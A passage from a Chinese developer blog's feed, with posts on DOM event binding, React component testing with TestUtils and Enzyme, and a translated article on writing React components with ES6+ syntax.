      &lt;p&gt;当我们打开网页时，我们会触发各种各样的事件，比如加载页面完成就会触发&lt;code&gt;onload&lt;/code&gt;事件，点击某个元素就会触发其&lt;code&gt;click&lt;/code&gt;事件。那么我们应该如何为我们的DOM元素绑定事件？一般操作事件会有三种方式:&lt;/p&gt;
&lt;h2 id=&quot;HTML事件处理程序-直接HTML内联属性（不建议这么做&quot;&gt;&lt;a href=&quot;#HTML事件处理程序-直接HTML内联属性（不建议这么做&quot; class=&quot;headerlink&quot; title=&quot;HTML事件处理程序 - 直接HTML内联属性（不建议这么做)&quot;&gt;&lt;/a&gt;HTML事件处理程序 - 直接HTML内联属性（不建议这么做)&lt;/h2&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&amp;lt;!--&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;这种方式使代码耦合，将javascript代码直接嵌入到了html中，不利于后期的代码维护，也不利于书写较长代码。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;button&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;onclick&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;alert(&#39;你点击了按钮&#39;);&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;点击按钮&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;button&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="前端基本功" scheme="http://blackganglion.com/categories/%E5%89%8D%E7%AB%AF%E5%9F%BA%E6%9C%AC%E5%8A%9F/"/>
    
    
      <category term="JavaScript基础" scheme="http://blackganglion.com/tags/JavaScript%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>唠一唠React的组件测试</title>
    <link href="http://blackganglion.com/2016/02/14/%E5%94%A0%E4%B8%80%E5%94%A0React%E7%9A%84%E7%BB%84%E4%BB%B6%E6%B5%8B%E8%AF%95/"/>
    <id>http://blackganglion.com/2016/02/14/唠一唠React的组件测试/</id>
    <published>2016-02-13T16:16:00.000Z</published>
    <updated>2016-07-08T15:16:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>刚做完前学僧的<a href="https://github.com/qianxueseng-com/js-projects/tree/master/401-react-clickable-grid" target="_blank" rel="external">401-react-clickable-grid</a>，项目本身并不难，但全部实现后的测试却让我有些犯难，newraina做的也并没有携带测试。好不容易参照网上的一篇博文与相应测试工具的文档完成简单的单元测试后，我无意中发现阮一峰老师在他的github上发布的<a href="https://github.com/ruanyf/react-testing-demo" target="_blank" rel="external">react-testing-demo</a>，刚好可以参照一下大牛的demo，阮老师写的React TodoList也是不错的学习样例哟。我同时结合网上的一些资料，对react的组件测试做一个小小的总结，当然极大部分参照了阮老师的英文README.md哒。</p>
<p>首先，React最重要的测试工具就是<a href="https://facebook.github.io/react/docs/test-utils.html" target="_blank" rel="external">official Test Utilities</a>，官方测试工具集，不过它只提供了较为低级的API。因此，出现了很多第三方的测试类库，不过他们大多基于官方测试集开发。测试库Enzyme是众多同类测试库中较为容易掌握的。</p>
<a id="more"></a>
<p>Test Utilities提供给用户两种测试选择:</p>
<h2 id="Shallow-Rendering-用来测试虚拟DOM对象"><a href="#Shallow-Rendering-用来测试虚拟DOM对象" class="headerlink" title="Shallow Rendering: 用来测试虚拟DOM对象"></a>Shallow Rendering: 用来测试虚拟DOM对象</h2><p>Shallow Rendering就仅仅渲染一层，是不对子组件进行渲染的，返回虚拟DOM对象</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> TestUtils <span class="keyword">from</span> <span class="string">'react-addons-test-utils'</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">shallowRender</span>(<span class="params">Component</span>) </span>&#123;</div><div class="line">  <span class="keyword">const</span> renderer = TestUtils.createRenderer();</div><div class="line">  renderer.render(<span class="xml"><span class="tag">&lt;<span class="name">Component</span>/&gt;</span></span>);</div><div class="line">  <span class="keyword">return</span> renderer.getRenderOutput();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>下面我们用一个非常简单的例子来理解一下什么是浅渲染，以及常用到的API:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 一个顶层组件App</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</div><div class="line">  render() &#123;</div><div class="line">     <span class="keyword">return</span> (</div><div class="line">      <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></div><div class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Todos<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">TodoList</span>/&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">AddTodo</span>/&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    );</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 使用chai的测试代码, 主要目的是测试&lt;h1&gt;Todos&lt;/h1&gt;</span></div><div class="line">describe(<span class="string">'Shallow Rendering'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  it(<span class="string">'App\'s title should be Todos'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// app为浅渲染的结果</span></div><div class="line">    <span class="keyword">const</span> app = shallowRender(App);</div><div class="line">    <span class="comment">/*</span></div><div class="line">    app.type为最外层的div.</div><div class="line">    app.props.chiledren为div下的三个子节点，但TodoList与AddTodo不会被继续渲染，仍以&lt;TodoList/&gt;&lt;AddTodo/&gt;的形式呈现.</div><div class="line">    app.props.chiledren[0]为div的第一个子节点，type为h1，同时测试h1的文本子节点(Todos).</div><div class="line">    */</div><div class="line">    expect(app.props.children[<span class="number">0</span>].type).to.equal(<span class="string">'h1'</span>);</div><div class="line">    expect(app.props.children[<span class="number">0</span>].props.children).to.equal(<span class="string">'Todos'</span>);</div><div class="line">  &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>当然shallowRender还可以进行扩展，传入props参数给组件，<code>renderer.render(&lt;Component {...props}/&gt;)</code>。</p>
<h2 id="DOM-Rendering-测试真正的DOM节点"><a href="#DOM-Rendering-测试真正的DOM节点" class="headerlink" title="DOM Rendering: 测试真正的DOM节点"></a>DOM Rendering: 测试真正的DOM节点</h2><p>第二种选择就是直接将React的组件渲染成真实的DOM，也就是完全渲染，使用<code>renderIntoDocument</code>方法。不过使用这个方法需要搭建DOM环境，这里我们采用<a href="https://github.com/tmpvar/jsdom" target="_blank" rel="external">jsdom</a>:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> jsdom <span class="keyword">from</span> <span class="string">'jsdom'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">document</span> === <span class="string">'undefined'</span>) &#123;</div><div class="line">  global.document = jsdom.jsdom(<span class="string">'&lt;!doctype html&gt;&lt;html&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;'</span>);</div><div class="line">  global.window = <span class="built_in">document</span>.defaultView;</div><div class="line">  global.navigator = global.window.navigator;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们需要在测试启动的命令行中require这段代码，修改<code>package.json</code>:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="string">"scripts"</span>: &#123;</div><div class="line">    <span class="string">"test"</span>: <span class="string">"mocha --compilers js:babel-core/register --require ./test/setup.js"</span>,</div><div class="line">  &#125;,</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>同样，用测试一条Todo的删除功能的代码来说明问题:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">describe(<span class="string">'DOM Rendering'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  it(<span class="string">'Click the delete button, the Todo item should be deleted'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// 这里的&lt;App /&gt;与上文相同，但会被全部渲染，由于&lt;TodoList/&gt;、&lt;AddTodo/&gt;组件代码过长，就不放在这里了</span></div><div class="line">    <span class="keyword">const</span> app = TestUtils.renderIntoDocument(<span class="xml"><span class="tag">&lt;<span class="name">App</span>/&gt;</span></span>);</div><div class="line">    <span class="comment">// 在渲染后的app中找出所有组件实例，并且是标签名字符合'li'的DOM组件</span></div><div class="line">    <span class="keyword">let</span> todoItems = TestUtils.scryRenderedDOMComponentsWithTag(app, <span class="string">'li'</span>);</div><div class="line">    <span class="comment">// 统计'li'的数量</span></div><div class="line">    <span class="keyword">let</span> todoLength = todoItems.length;</div><div class="line">    <span class="comment">// 这里可以使用document的API，选择元素'button'</span></div><div class="line">    <span class="keyword">let</span> deleteButton = todoItems[<span class="number">0</span>].querySelector(<span class="string">'button'</span>);</div><div class="line">    <span class="comment">// Simulate 模拟点击事件</span></div><div class="line">    TestUtils.Simulate.click(deleteButton);</div><div class="line">    <span class="comment">// 再次统计'li'的数量，若通过点击删除了一条Todo，则总数会减少1</span></div><div class="line">    <span class="keyword">let</span> todoItemsAfterClick = TestUtils.scryRenderedDOMComponentsWithTag(app, <span class="string">'li'</span>);</div><div class="line">    expect(todoItemsAfterClick.length).to.equal(todoLength - <span class="number">1</span>);</div><div class="line">  &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>当然官方还提供了各种寻找node的方法，例如通过class、tag、type等等，详见<a href="https://facebook.github.io/react/docs/test-utils.html#shallow-rendering" target="_blank" rel="external">官方说明</a>.</p>
<p>官方提供的API比较长，我们可以利用<code>react-dom</code>的<code>findDOMNode</code>方法。我们也用一个例子来说明，用户点击一条Todo后会有一道线划掉它，表示已经做完:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> &#123;findDOMNode&#125; <span class="keyword">from</span> <span class="string">'react-dom'</span>;</div><div class="line">describe(<span class="string">'DOM Rendering'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">done</span>) </span>&#123;</div><div class="line">  it(<span class="string">'When click the Todo item，it should become done'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// renderIntoDocument返回ReactComponent</span></div><div class="line">    <span class="keyword">const</span> app = TestUtils.renderIntoDocument(<span class="xml"><span class="tag">&lt;<span class="name">App</span>/&gt;</span></span>);</div><div class="line">    <span class="comment">// findDOMNode(component)获取到组件中真实的DOM</span></div><div class="line">    <span class="keyword">const</span> appDOM = findDOMNode(app);</div><div class="line">    <span class="keyword">const</span> todoItem = appDOM.querySelector(<span class="string">'li:first-child span'</span>);</div><div class="line">    <span class="comment">// 是否包含class为'todo-done'</span></div><div class="line">    <span class="keyword">let</span> isDone = todoItem.classList.contains(<span class="string">'todo-done'</span>);</div><div class="line">    <span class="comment">// 进行点击测试，状态是否改变</span></div><div class="line">    TestUtils.Simulate.click(todoItem);</div><div class="line">    expect(todoItem.classList.contains(<span class="string">'todo-done'</span>)).to.be.equal(!isDone);</div><div class="line">  &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>这里阮大大说: <code>findDOMNode</code>方法的最大优点，就是支持复杂的CSS选择器。这是<code>TestUtils</code>本身不提供的。这里我也提出了自己的疑问，这个差异是如何体现的？querySelector()作为DOM的API，在findDOMNode和TestUtils渲染出来的DOM上操作应该是一致的吧。</p>
<hr>
<p>在我自己的写的小项目中，我使用了<a href="https://github.com/airbnb/enzyme" target="_blank" rel="external">Enzyme</a>，对官方测试库进行了封装。主要提供了三种使用方法:</p>
<h2 id="Shallow-Rendering-shallow"><a href="#Shallow-Rendering-shallow" class="headerlink" title="Shallow Rendering - shallow"></a>Shallow Rendering - shallow</h2><p>它与官方测试库的浅渲染类似，只会渲染一层组件，<code>shallow(node[, options]) =&gt; ReactWrapper</code></p>
<p>注意:<code>.html()</code>会将组件完全渲染后返回字符串，可以使用<code>.shallow()</code>再渲染子组件，<code>.find()</code>只支持简单选择器，<code>.type()</code>可返回组件的类型，<code>.text()</code>返回文本内容。</p>
<h2 id="Full-DOM-Rendering-mount"><a href="#Full-DOM-Rendering-mount" class="headerlink" title="Full DOM Rendering - mount"></a>Full DOM Rendering - mount</h2><p>全部渲染，enzyme已经利用jsdom模拟出一个浏览器的js环境。</p>
<h2 id="Static-Rendered-Markup-render"><a href="#Static-Rendered-Markup-render" class="headerlink" title="Static Rendered Markup - render"></a>Static Rendered Markup - render</h2><p>全部渲染，render方法将React组件渲染成静态的HTML字符串，然后分析这段HTML代码的结构，返回一个对象。主要是采用了第三方HTML解析库Cheerio。</p>
<p>最后，说一个小插曲吧，正当我兴高采烈地写着这篇博文时，阮一峰大大也发布将README.md用中文进行整理发到了他的博客上 - <a href="http://www.ruanyifeng.com/blog/2016/02/react-testing-tutorial.html" target="_blank" rel="external">React 测试入门教程</a>，又是一篇好文！还以为阮大大只是推推github不发文呢，小忧伤，哈哈~~</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刚做完前学僧的&lt;a href=&quot;https://github.com/qianxueseng-com/js-projects/tree/master/401-react-clickable-grid&quot;&gt;401-react-clickable-grid&lt;/a&gt;，项目本身并不难，但全部实现后的测试却让我有些犯难，newraina做的也并没有携带测试。好不容易参照网上的一篇博文与相应测试工具的文档完成简单的单元测试后，我无意中发现阮一峰老师在他的github上发布的&lt;a href=&quot;https://github.com/ruanyf/react-testing-demo&quot;&gt;react-testing-demo&lt;/a&gt;，刚好可以参照一下大牛的demo，阮老师写的React TodoList也是不错的学习样例哟。我同时结合网上的一些资料，对react的组件测试做一个小小的总结，当然极大部分参照了阮老师的英文README.md哒。&lt;/p&gt;
&lt;p&gt;首先，React最重要的测试工具就是&lt;a href=&quot;https://facebook.github.io/react/docs/test-utils.html&quot;&gt;official Test Utilities&lt;/a&gt;，官方测试工具集，不过它只提供了较为低级的API。因此，出现了很多第三方的测试类库，不过他们大多基于官方测试集开发。测试库Enzyme是众多同类测试库中较为容易掌握的。&lt;/p&gt;
    
    </summary>
    
      <category term="React全家桶" scheme="http://blackganglion.com/categories/React%E5%85%A8%E5%AE%B6%E6%A1%B6/"/>
    
    
      <category term="React测试" scheme="http://blackganglion.com/tags/React%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>[译]React on ES6+</title>
    <link href="http://blackganglion.com/2016/02/09/%E8%AF%91-React-on-ES6/"/>
    <id>http://blackganglion.com/2016/02/09/译-React-on-ES6/</id>
    <published>2016-02-09T14:45:00.000Z</published>
    <updated>2016-07-08T15:32:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>原文地址: <a href="http://babeljs.io/blog/2015/06/07/react-on-es6-plus" target="_blank" rel="external">http://babeljs.io/blog/2015/06/07/react-on-es6-plus</a></p>
<blockquote>
<p>这是一篇来自Steven Luscher的特邀文章，Steven在Facebook从事于Relay的开发，一个javascript框架使用React与GraphQL用来构建应用。在<a href="https://instagram.com/steveluscher/" target="_blank" rel="external">Instagram</a>，<a href="https://github.com/steveluscher" target="_blank" rel="external">GitHub</a>和<a href="https://twitter.com/steveluscher" target="_blank" rel="external">Twitter</a>关注Steven。</p>
</blockquote>
<p>当我们今年重构<a href="https://instagram.com/instagram/" target="_blank" rel="external">Instagram Web</a>时，更加热衷于使用一些ES6+的新特性来构建React组件。请允许我强调一些新特性来改变你构建React应用的方法，让它变得更加简单与有趣。</p>
<a id="more"></a>
<h2 id="Classes-类"><a href="#Classes-类" class="headerlink" title="Classes (类)"></a>Classes (类)</h2><p>当我们选择使用ES6+的<a href="https://babeljs.io/docs/learn-es2015/#classes" target="_blank" rel="external">类语法定义</a>来构建React组件时，这便是到目前为止代码层最明显的改变。我们能定义一个真正的ES6类继承自<code>React.Component</code>，来替代<code>React.createClass</code>去定义一个组件:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Photo</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</div><div class="line">  render() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&#123;this.props.caption&#125;</span> <span class="attr">src</span>=<span class="string">&#123;this.props.src&#125;</span> /&gt;</span>;</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>你会马上意识到一个细微的不同 - 一个更为精炼的语法当你定义类时可以被使用:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// ES5</span></div><div class="line"><span class="keyword">var</span> Photo = React.createClass(&#123;</div><div class="line">  handleDoubleTap: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123; … &#125;,</div><div class="line">  render: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; … &#125;,</div><div class="line">&#125;);</div><div class="line"><span class="comment">// ES6+</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Photo</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</div><div class="line">  handleDoubleTap(e) &#123; … &#125;</div><div class="line">  render() &#123; … &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们可以略去一对括号，一个结尾分号，对于每个方法而言可以略去一个冒号，一个<code>function</code>关键字和一个逗号。（这段话好傻逼）</p>
<p>当你使用新的类语法时，你可以定义任何生命周期方法除了<code>componentWillMount</code>，类的<code>constructor</code>现在已经充当了<code>componentWillMount</code>的角色:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// ES5</span></div><div class="line"><span class="keyword">var</span> EmbedModal = React.createClass(&#123;</div><div class="line">  componentWillMount: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; … &#125;,</div><div class="line">&#125;);</div><div class="line"><span class="comment">// ES6+</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">EmbedModal</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>(props) &#123;</div><div class="line">    <span class="keyword">super</span>(props);</div><div class="line">    <span class="comment">// 在componentWillMount中执行的操作可以放在这里</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="Property-initializers-属性初始化器"><a href="#Property-initializers-属性初始化器" class="headerlink" title="Property initializers (属性初始化器)"></a>Property initializers (属性初始化器)</h2><p>在ES6+的类中，属性类型与默认值作为类自身的静态属性。当然，使用ES7的属性初始化器，也作为组件的初始化状态:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// ES5</span></div><div class="line"><span class="keyword">var</span> Video = React.createClass(&#123;</div><div class="line">  getDefaultProps: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> &#123;</div><div class="line">      autoPlay: <span class="literal">false</span>,</div><div class="line">      maxLoops: <span class="number">10</span>,</div><div class="line">    &#125;;</div><div class="line">  &#125;,</div><div class="line">  getInitialState: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> &#123;</div><div class="line">      loopsRemaining: <span class="keyword">this</span>.props.maxLoops,</div><div class="line">    &#125;;</div><div class="line">  &#125;,</div><div class="line">  propTypes: &#123;</div><div class="line">    autoPlay: React.PropTypes.bool.isRequired,</div><div class="line">    maxLoops: React.PropTypes.number.isRequired,</div><div class="line">    posterFrameSrc: React.PropTypes.string.isRequired,</div><div class="line">    videoSrc: React.PropTypes.string.isRequired,</div><div class="line">  &#125;,</div><div class="line">&#125;);</div><div class="line"><span class="comment">// ES6+</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Video</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</div><div class="line">  <span class="keyword">static</span> defaultProps = &#123;</div><div class="line">    autoPlay: <span class="literal">false</span>,</div><div class="line">    maxLoops: <span class="number">10</span>,</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">static</span> propTypes = &#123;</div><div class="line">    autoPlay: React.PropTypes.bool.isRequired,</div><div class="line">    maxLoops: React.PropTypes.number.isRequired,</div><div class="line">    posterFrameSrc: React.PropTypes.string.isRequired,</div><div class="line">    videoSrc: React.PropTypes.string.isRequired,</div><div class="line">  &#125;</div><div class="line">  state = &#123;</div><div class="line">    loopsRemaining: <span class="keyword">this</span>.props.maxLoops,</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>ES7属性初始化器是在类的构造函数中执行的，<code>this</code>指向类在构造函数下的实例，所以初始化状态设置仍依靠<code>this.props</code>。由此，我们不必定义属性的默认值与在getter方法中初始化状态。</p>
<h2 id="Arrow-functions-箭头函数"><a href="#Arrow-functions-箭头函数" class="headerlink" title="Arrow functions (箭头函数)"></a>Arrow functions (箭头函数)</h2><p><code>React.createClass</code>方法进行了一些额外的绑定工作在你的组件实例方法中，去确保在这些方法中<code>this</code>关键字指向组件的实例。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// React.createClass已经自动绑定</span></div><div class="line"><span class="keyword">var</span> PostInfo = React.createClass(&#123;</div><div class="line">  handleOptionsButtonClick: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">    <span class="comment">// 这里，'this'指向组件实例。</span></div><div class="line">    <span class="keyword">this</span>.setState(&#123;showOptionsModal: <span class="literal">true</span>&#125;);</div><div class="line">  &#125;,</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>当我们定义组件使用ES6类语法后，我们不再需要<code>React.createClass</code>方法，这使我们需要手工绑定实例方法当我们有如下行为:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 在哪里需要时，进行手工绑定</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">PostInfo</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>(props) &#123;</div><div class="line">    <span class="keyword">super</span>(props);</div><div class="line">    <span class="comment">// 手动绑定this到该实例方法</span></div><div class="line">    <span class="keyword">this</span>.handleOptionsButtonClick = <span class="keyword">this</span>.handleOptionsButtonClick.bind(<span class="keyword">this</span>);</div><div class="line">  &#125;</div><div class="line">  handleOptionsButtonClick(e) &#123;</div><div class="line">    <span class="comment">// 确认this已经指向了该组件实例</span></div><div class="line">    <span class="keyword">this</span>.setState(&#123;showOptionsModal: <span class="literal">true</span>&#125;);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>幸运的是，结合两个ES6+的特性 - <a href="https://babeljs.io/docs/learn-es2015/#arrows" target="_blank" rel="external">箭头函数</a>和属性初始化器，绑定组件实例变得十分轻而易举。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">PostInfo</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</div><div class="line">  handleOptionsButtonClick = (e) =&gt; &#123;</div><div class="line">    <span class="keyword">this</span>.setState(&#123;showOptionsModal: <span class="literal">true</span>&#125;);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>ES6箭头函数内部围绕相同词法的this展开代码，这个方法使ES7属性构造器在作用域内，由此给了我们所期望的结果。<a href="https://babeljs.io/repl/#?experimental=true&evaluate=true&loose=false&spec=false&code=class%20PostInfo%20extends%20React.Component%20%7B%0A%09handleOptionsButtonClick%20%3D%20(e)%20%3D%3E%20%7B%0A%20%20%20%20this.setState(%7BshowOptionsModal%3A%20true%7D)%3B%0A%20%20%7D%0A%7D" target="_blank" rel="external">看看转换代码</a>去了解它是怎么工作的。</p>
<h2 id="Dynamic-property-names-amp-template-strings-动态属性名称-amp-模板字符串"><a href="#Dynamic-property-names-amp-template-strings-动态属性名称-amp-模板字符串" class="headerlink" title="Dynamic property names &amp; template strings (动态属性名称 &amp; 模板字符串)"></a>Dynamic property names &amp; template strings (动态属性名称 &amp; 模板字符串)</h2><p><a href="https://babeljs.io/docs/learn-es2015/#enhanced-object-literals" target="_blank" rel="external">对象常量增强</a>有一条包含分配派生属性名称的能力。我们可能最初会这样地去设置一些状态:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Form</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</div><div class="line">  onChange(inputName, e) &#123;</div><div class="line">    <span class="keyword">this</span>.setState(&#123;</div><div class="line">      [<span class="string">`<span class="subst">$&#123;inputName&#125;</span>Value`</span>]: e.target.value,</div><div class="line">    &#125;);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>现在我们能够去构建一个javascript表达式在运行时确定对象的属性名称。这里，我们使用一个<a href="https://babeljs.io/docs/learn-es2015/#template-strings" target="_blank" rel="external">模板字符串</a>去确定哪一个属性要被设置状态:</p>
